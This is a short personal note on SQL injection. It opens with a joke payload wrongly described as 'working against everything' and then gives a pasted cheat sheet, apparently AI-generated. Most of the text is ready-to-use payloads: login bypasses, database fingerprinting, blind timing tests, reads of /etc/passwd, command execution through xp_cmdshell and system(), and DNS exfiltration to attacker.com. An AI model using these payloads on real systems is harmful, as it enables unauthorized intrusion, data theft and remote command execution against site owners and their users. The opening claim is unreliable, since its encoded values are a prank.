### Title: sql payload working against everything
Tags: #sqli 
Author:
Reference: x.com

#### Notes
**Summary**: 1-2 sentence overview
**Notes**:
```sh
/?query="OR 1=1;--"&val1=ZGlkbnQgZXZlbiByZWFk&val2=aHR0cHM6Ly95b3V0dS5iZS9kUXc0dzlXZ1hjUQ%3D%3D&SLEEP(420)
```
damn this payload is working against everyhing.



Here's a consolidated file containing all the SQL injection (SQLI) payloads from the previous context, organized by category:

---

### **SQL Injection Payloads Cheat Sheet**

#### **1. Basic Detection Payloads**
```sql
'               -- Test for syntax error
''              -- Test if error disappears (escape sequence)
'||'test        -- Oracle concatenation test
'+'test         -- MS-SQL concatenation test
' 'test         -- MySQL concatenation test (note space)
%               -- Wildcard test (returns many results if SQL-backed)
```

#### **2. Database Fingerprinting Payloads**
```sql
' AND 1=1--     -- Basic boolean test (true condition)
' AND 1=2--     -- Basic boolean test (false condition)
' UNION SELECT 1,2,3--    -- Union-based test
```

**Database-Specific Version Checks:**
```sql
' AND 1=CONVERT(int,@@version)--      -- MS-SQL version check
' OR 1=1 IN (SELECT @@version)--      -- Alternative MS-SQL
' UNION SELECT 1,version(),3--        -- MySQL version check
' UNION SELECT 1,banner,3 FROM v$version--  -- Oracle version
```

#### **3. Time-Based Blind SQLi Payloads**
```sql
'; WAITFOR DELAY '0:0:5'--    -- MS-SQL delay test
' AND (SELECT sleep(5))--      -- MySQL delay test
'||DBMS_PIPE.RECEIVE_MESSAGE('a',5)--  -- Oracle delay
```

#### **4. Login Bypass Payloads**
```sql
admin'--                      -- Basic comment-based bypass
' OR '1'='1                   -- Classic tautology
' OR 1=1--                    -- Same as above (MS-SQL)
admin'/*                      -- MySQL comment bypass
```

#### **5. Error-Based SQLi Payloads**
```sql
' AND 1=CONVERT(int,@@version)--      -- MS-SQL error-based
' AND 1=(SELECT 1 FROM dual)--        -- Oracle error test
' AND EXTRACTVALUE(1,CONCAT(0x5c,version()))--  -- MySQL error
```

#### **6. File Access Payloads (If DB permits)**
```sql
' UNION SELECT 1,load_file('/etc/passwd'),3--   -- MySQL file read
' UNION SELECT 1,text,3 FROM OPENROWSET(BULK 'C:\file.txt')--  -- MS-SQL
```

#### **7. Command Execution Payloads (Dangerous!)**
```sql
'; EXEC xp_cmdshell('whoami')--      -- MS-SQL command exec
' UNION SELECT 1,system('id'),3--    -- MySQL (if enabled)
' OR 1=1$({system('id')})            -- If app uses shell
```

#### **8. OOB (Out-of-Band) Payloads**
```sql
' UNION SELECT 1,LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\file')),3--  -- DNS exfiltration
'; DECLARE @q VARCHAR(1024);SET @q='\\'+@@version+'.attacker.com\\foo';EXEC master..xp_dirtree @q--  -- MS-SQL DNS
```

---
